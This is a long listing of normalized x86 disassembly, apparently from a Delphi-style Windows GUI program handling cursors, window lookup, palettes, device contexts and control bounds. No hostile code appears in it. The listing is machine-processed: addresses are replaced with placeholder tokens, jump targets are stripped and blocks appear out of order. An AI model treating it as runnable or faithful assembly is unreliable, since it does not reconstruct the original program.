cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax + 0x14 ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x18 ]
mov [ ebp - 0x6 ] edx
jmp r-xdata
mov [ ebp - 0x2 ] al
cmp [ rw-data ] 0x2
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
push ebp
call sub_453f60
pop ecx
test al al
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebp - 0x2 ] 0x0
je r-xdata
mov al 0x1
call sub_45388c
test al al
je r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call SetCursor
mov eax [ rw-data ]
call sub_45dfbc
jmp r-xdata
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454235
mov eax [ rw-data ]
call sub_4031ec
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_46cc58
test eax eax
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x0
mov eax [ ebp - 0x6 ]
push eax
mov al [ ebp - 0x2 ]
push eax
mov eax [ rw-data ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xa ]
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx ]
mov al 0x3
cmp [ ebp - 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
xor ecx ecx
mov edx 0xb03a
mov eax [ rw-data ]
call sub_456c00
jmp r-xdata
mov edx [ eax + 0x220 ]
cmp edx [ ebx + 0x38 ]
jne r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ rw-data ]
add edx 0xc
push edx
mov edx [ rw-data ]
mov edx [ edx + 0x8 ]
mov ecx [ rw-data ]
xchg edx eax
call sub_453758
mov al 0x4
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0xc ] ecx
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0x10 ] ecx
xor edx edx
mov [ ebp - 0xa ] edx
xor edx edx
mov [ ebp - 0x6 ] edx
xor edx edx
call sub_4708c4
sub_454235
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
retn
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_403378
test al al
jne r-xdata
mov eax [ rw-data ]
call sub_4031ec
mov eax [ rw-data ]
mov edx [ rw-data ]
call sub_403378
test al al
jne r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
sub_4542c4
push ebx
push esi
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_4528d8
mov esi eax
test esi esi
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_4542f8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor esi esi
mov eax edi
call sub_4542c4
mov ebp eax
test ebp ebp
je r-xdata
mov eax esi
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi ebp
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax ebp
call sub_455590
lea edx [ esp + 0x4 ]
mov ecx ebx
mov eax ebp
call sub_459c34
test eax eax
je r-xdata
mov esi eax
sub_454340
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx esi
call sub_418c68
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ ebx ] eax
sub_454368
push ebx
mov ebx eax
mov eax [ ebx ]
call sub_418f60
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx ]
call sub_4031ec
xor eax eax
mov [ ebx ] eax
sub_454388
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
push esp
push ebx
call GetWindowOrgEx
push 0x0
mov eax [ esp + 0x8 ]
sub eax edi
push eax
mov eax [ esp + 0x8 ]
sub eax esi
push eax
push ebx
call SetWindowOrgEx
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_4543b8
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ rw-data ]
call sub_419188
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_454468
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_4191ec
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0xc ]
jne r-xdata
xor eax eax
push ebp
push sub_454441
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
call sub_4545f4
call sub_403a64
call sub_403a64
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_418dc4
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
call sub_4255d4
test al al
je r-xdata
mov esp ebp
pop ebp
retn
sub_454474
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_419188
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_454512
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454519
mov eax [ rw-data ]
call sub_4191ec
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_4544ea
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_4545f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_425630
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_418dc4
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_4255d4
test al al
je r-xdata
sub_454520
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
mov eax esi
call sub_4545f4
mov edx ebx
and dl 0xfc
mov eax esi
call sub_425188
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_45454c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4257b4
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_4257b8
mov eax [ ebp - 0x4 ]
call sub_454640
mov eax [ rw-data ]
call sub_419188
mov ebx eax
xor eax eax
push ebp
push sub_4545d1
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x8 ] 0x4
jl r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x60 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_418c68
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_4191ec
retn
call sub_4543b8
sub_4545f4
push ebx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
je r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_4257b8
mov edx ebx
mov eax [ rw-data ]
call sub_41919c
mov eax [ ebx + 0x5c ]
push eax
mov eax [ ebx + 0x60 ]
push eax
call ReleaseDC
xor eax eax
mov [ ebx + 0x5c ] eax
sub_454640
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x58 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_456090
test al al
je r-xdata
and [ ebx + 0x54 ] 0xffffff7f
or [ ebx + 0x54 ] 0x80
jmp r-xdata
sub_45466c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4031bc
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_4546a8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_4194bc
pop esi
pop ebx
retn
mov eax ebx
mov edx [ esi + 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ esi + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x14 ]
mov [ eax + 0x14 ] edx
mov edx [ esi + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_4546f0
push esi
mov esi eax
sub edx 0x1
jb r-xdata
cmp ecx [ esi + 0x8 ]
je r-xdata
je r-xdata
pop esi
retn
mov [ esi + 0x8 ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0xc ]
je r-xdata
dec edx
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x10 ]
jae r-xdata
mov [ esi + 0xc ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0x10 ]
je r-xdata
dec edx
je r-xdata
mov [ esi + 0x10 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x14 ]
jae r-xdata
mov [ esi + 0x10 ] ecx
mov eax [ esi + 0x8 ]
test eax eax
jbe r-xdata
cmp ecx [ esi + 0x14 ]
je r-xdata
jmp r-xdata
mov [ esi + 0x14 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp eax ecx
jae r-xdata
mov [ esi + 0x14 ] ecx
mov eax [ esi + 0xc ]
test eax eax
jbe r-xdata
mov [ esi + 0x8 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
cmp eax ecx
jae r-xdata
mov [ esi + 0xc ] ecx
sub_4547ac
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1c ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_454879
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454880
lea eax [ ebp - 0x1c ]
call sub_403f7c
lea eax [ ebp - 0x8 ]
call sub_403f7c
retn
mov edx edi
mov eax [ ebx + 0x10 ]
mov si 0xffee
call sub_4033e8
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x7c ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea edx [ ebp - 0x1c ]
mov eax [ ebx + 0x10 ]
mov ax [ eax + 0x84 ]
call sub_465310
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_409070
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_403fd0
sub_45489c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_454903
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_461ecc
test al al
je r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x18 ]
call sub_455a4c
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40339c
mov edx [ eax + 0x64 ]
pop eax
call sub_404388
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45490a
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
mov al 0x1
sub_454910
push ebx
mov ebx eax
mov eax ebx
call sub_461ef4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x50 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40339c
pop edx
cmp dl [ eax + 0x6a ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_454944
push ebx
mov ebx eax
mov eax ebx
call sub_461f44
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40339c
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x80 ]
call sub_404388
je r-xdata
mov al 0x1
pop ebx
retn
sub_45497c
push ebx
mov ebx eax
mov eax ebx
call sub_461f80
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40339c
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x57 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4549b0
push ebx
mov ebx eax
mov eax ebx
call sub_421bdc
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x120 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4549d8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_455a7c
sub_4549f8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
sub_454a18
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x80
mov edx esi
call sub_403fd0
sub_454a3c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_45596c
sub_454a5c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x120 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x124 ] edx
sub_454a88
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40339c
mov edi eax
mov eax [ edi + 0x74 ]
mov esi [ ebx + 0x18 ]
cmp eax [ esi + 0x158 ]
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40339c
mov edx [ edi + 0x78 ]
mov eax [ esi + 0x154 ]
call sub_404388
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40339c
mov al [ edi + 0x70 ]
cmp al [ esi + 0x150 ]
je r-xdata
mov al 0x1
sub_454aec
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_4553c8
sub_454b0c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_4553b4
sub_454b2c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0x150 ] bl
sub_454b4c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4212ec
mov [ ebx + 0x3c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebx + 0x38 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4245d4
mov esi eax
mov [ ebx + 0x68 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_455afc
mov al [ r-xdata ]
mov [ ebx + 0x61 ] al
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45466c
mov esi eax
mov [ ebx + 0x74 ] esi
mov [ esi + 0x1c ] ebx
mov [ esi + 0x18 ] sub_4569c0
mov [ ebx + 0x70 ] 0xff000005
mov [ ebx + 0x57 ] 0x1
mov [ ebx + 0x58 ] 0x1
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x9a ] 0x1
mov [ ebx + 0x60 ] 0x1
mov [ ebx + 0x5e ] 0x0
mov [ ebx + 0x7a ] 0xfff4
mov eax [ r-xdata ]
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x150 ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_454c24
push ebx
push esi
push edi
add esp 0xfffffff0
call sub_4035b8
mov ebx edx
mov edi eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx edi
call sub_4747dc
mov eax [ edi + 0xa0 ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4035a0
push edi
xor ecx ecx
mov edx 0xb039
call sub_456c00
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov edx esp
mov eax edi
call sub_4553ec
mov ecx esp
or edx 0xffffffff
mov eax edi
mov si 0xffcc
call sub_4033e8
xor eax eax
mov [ edi + 0xa0 ] eax
jmp r-xdata
mov eax [ edi + 0x6c ]
call sub_4031ec
xor eax eax
mov [ edi + 0x6c ] eax
mov eax [ edi + 0x74 ]
call sub_4031ec
mov eax [ edi + 0x68 ]
call sub_4031ec
mov eax [ edi + 0x64 ]
call sub_408be0
mov edx ebx
and dl 0xfc
mov eax edi
call sub_421338
test bl bl
jle r-xdata
sub_454cf0
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
sub_454d18
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] dl
mov ebp eax
xor ebx ebx
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
mov si 0xffd7
call sub_4033e8
mov edi eax
test edi edi
je r-xdata
lea edx [ esp + 0x4 ]
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
mov al [ esp ]
xor al 0x1
neg al
sbb eax eax
push eax
push edi
push esi
call SelectPalette
mov edi eax
push esi
call RealizePalette
test eax eax
je r-xdata
push 0xffffffff
push edi
push esi
call SelectPalette
push esi
mov eax [ esp + 0x8 ]
push eax
call ReleaseDC
mov bl 0x1
mov eax ebp
mov edx [ eax ]
call [ edx + 0x7c ]
sub_454da0
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x61 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x61 ] al
mov eax ebx
call sub_4550a0
sub_454dc0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
or [ ebx + 0x50 ] 0x8000
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
mov eax [ ebx + 0x6c ]
call sub_4031ec
xor eax eax
mov [ ebx + 0x6c ] eax
and [ ebx + 0x50 ] 0xffff7fff
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x6c ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_457a1c
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_4033e8
mov edx ebx
mov eax edi
call sub_4213bc
mov eax ebx
mov si 0xffd9
call sub_4033e8
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x6c ] eax
pop edi
pop esi
pop ebx
retn
sub_454e88
push ebx
push esi
push edi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x8
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_42174c
and [ ebx + 0x54 ] 0xfff7
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_456c00
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_456c00
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_456c00
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax ebx
call sub_456c00
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_456c00
sub_454f1c
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_421608
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x7c ]
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp edi eax
jne r-xdata
xor edx edx
mov eax esi
call sub_455a04
jmp r-xdata
xor edx edx
mov eax esi
call sub_454dc0
sub_454f60
push ebx
push esi
push edi
push ecx
mov ebx edx
mov edi eax
mov al [ edi + 0x5b ]
cmp bl al
je r-xdata
mov eax edi
mov si 0xffd0
call sub_4033e8
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] al
mov [ edi + 0x5b ] bl
xor eax eax
mov al bl
mov dl [ eax + rw-data ]
mov eax edi
call sub_454da0
test [ edi + 0x1c ] 0x1
jne r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
cmp bl 0x6
je r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
cmp [ esp ] 0x6
je r-xdata
mov al [ esp ]
dec eax
sub al 0x2
setb al
mov edx ebx
add dl 0xfd
sub dl 0x2
setb dl
cmp al dl
jne r-xdata
mov eax edi
mov si 0xffee
call sub_4033e8
mov al [ esp ]
test al al
je r-xdata
sub al 0x5
je r-xdata
test bl bl
je r-xdata
sub bl 0x5
je r-xdata
mov eax [ edi + 0x4c ]
push eax
mov eax [ edi + 0x48 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx [ edi + 0x40 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
jmp r-xdata
sub_455008
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea ecx [ ebp + 0x8 ]
lea edx [ ebp + 0xc ]
mov eax ebx
call sub_457190
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp esi [ ebx + 0x40 ]
jne r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_455e94
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_4550a0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
push 0x0
xor ecx ecx
mov edx 0x47
mov eax ebx
call sub_456c00
mov eax ebx
mov si 0xffd0
call sub_4033e8
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov eax ebx
mov si 0xffcf
call sub_4033e8
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
sub_4550a0
push ebx
push esi
add esp 0xfffffff0
mov esi eax
cmp [ esi + 0x62 ] 0x0
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
jne r-xdata
mov bl [ esi + 0x61 ]
mov al [ r-xdata ]
cmp al bl
jne r-xdata
test bl 0x4
je r-xdata
xor eax eax
mov [ esi + 0x90 ] eax
xor eax eax
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
sar eax 0x1
jns r-xdata
test bl 0x1
je r-xdata
add eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
adc eax 0x0
mov eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
sar eax 0x1
jns r-xdata
test bl 0x2
je r-xdata
test bl 0x8
je r-xdata
add eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
adc eax 0x0
mov eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
mov [ esi + 0x8c ] eax
jmp r-xdata
test [ ebx + 0x1c ] 0x2
je r-xdata
mov ebx [ esi + 0x30 ]
test ebx ebx
je r-xdata
mov eax ebx
call sub_45c684
test al al
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x48 ]
mov [ esi + 0x90 ] eax
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x4c ]
mov [ esi + 0x94 ] eax
mov edx esp
mov eax [ esi + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ esi + 0x90 ] eax
mov eax [ esp + 0xc ]
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ ebx + 0x1fa ]
mov [ esi + 0x90 ] eax
mov eax [ ebx + 0x1fe ]
mov [ esi + 0x94 ] eax
jmp r-xdata
sub_4551bc
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x1
pop esi
pop ebx
retn
sub_4551e0
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx edx
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x2
pop esi
pop ebx
retn
sub_455208
push ebx
push esi
mov esi eax
push edx
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x4
pop esi
pop ebx
retn
sub_45522c
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
push edx
mov ecx [ esi + 0x44 ]
